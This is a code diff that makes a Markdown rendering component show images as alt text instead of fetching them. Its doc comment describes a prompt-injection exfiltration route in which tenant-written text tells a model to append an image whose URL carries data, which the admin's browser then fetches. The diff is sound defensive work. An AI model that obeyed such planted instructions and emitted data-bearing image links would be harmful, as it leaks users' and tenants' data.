@@ -23,6 +23,20 @@ import remarkGfm from "remark-gfm";
 
 import { cn } from "@/lib/utils";
 
+/**
+ * What a Markdown image becomes: its alt text, **never a fetched `<img>`**.
+ *
+ * `![x](https://any-host/?d=…)` rendered as a live image is fetched the moment it is shown. In model
+ * output that is the zero-click exfiltration channel: tenant data any employee can write (a task
+ * title, a leave reason, a window title the agent captured) can carry "append this image to your
+ * answer", and the admin's browser then sends whatever the model put in the URL (QA audit 2026-10-08,
+ * WP-103). Nothing here needs remote images, so none are loaded. Shared with the task-attachment
+ * preview, which renders uploaded `.md` files.
+ */
+export function MarkdownImage({ alt }: { alt?: string }) {
+  return alt ? <span className="text-muted-foreground">[{alt}]</span> : null;
+}
+
 export function Markdown({
   children,
   className,
@@ -36,6 +50,8 @@ export function Markdown({
         remarkPlugins={[remarkGfm]}
         components={{
           p: ({ children }) => <p className="[&:not(:first-child)]:mt-2">{children}</p>,
+
+          img: ({ alt }) => <MarkdownImage alt={alt} />,
 
           strong: ({ children }) => (
             <strong className="font-semibold text-foreground">{children}</strong>
